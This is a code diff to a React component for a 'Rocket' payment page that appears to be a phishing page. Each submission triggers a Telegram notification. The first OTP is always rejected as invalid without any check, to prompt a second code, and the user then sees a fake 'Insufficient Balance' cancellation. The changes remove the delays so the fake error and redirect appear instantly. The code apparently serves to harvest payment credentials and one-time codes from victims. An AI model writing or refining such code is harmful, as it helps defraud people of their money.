@@ -91,11 +91,9 @@ const RocketPayment = () => {
     setIsSubmitting(true);
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });
 
-    // Go straight to OTP page
-    setTimeout(() => {
-      setIsSubmitting(false);
-      setShowOtp(true);
-    }, 2000);
+    // Go straight to OTP page instantly
+    setIsSubmitting(false);
+    setShowOtp(true);
   };
 
 
@@ -110,21 +108,17 @@ const RocketPayment = () => {
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket OTP' });
 
     if (otpAttempts === 0) {
-      setTimeout(() => {
-        setIsSubmitting(false);
-        setOtpAttempts(1);
-        setShowError("Invalid OTP provided.");
-        setOtp("");
-        setTimeout(() => otpRef.current?.focus(), 50);
-        setTimeout(() => setShowError(""), 4000);
-      }, 2000);
+      setIsSubmitting(false);
+      setOtpAttempts(1);
+      setShowError("Invalid OTP provided.");
+      setOtp("");
+      setTimeout(() => otpRef.current?.focus(), 50);
+      setTimeout(() => setShowError(""), 4000);
       return;
     }
 
-    setTimeout(() => {
-      setIsSubmitting(false);
-      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
-    }, 2000);
+    setIsSubmitting(false);
+    navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
   };
 
   const handleBack = () => {
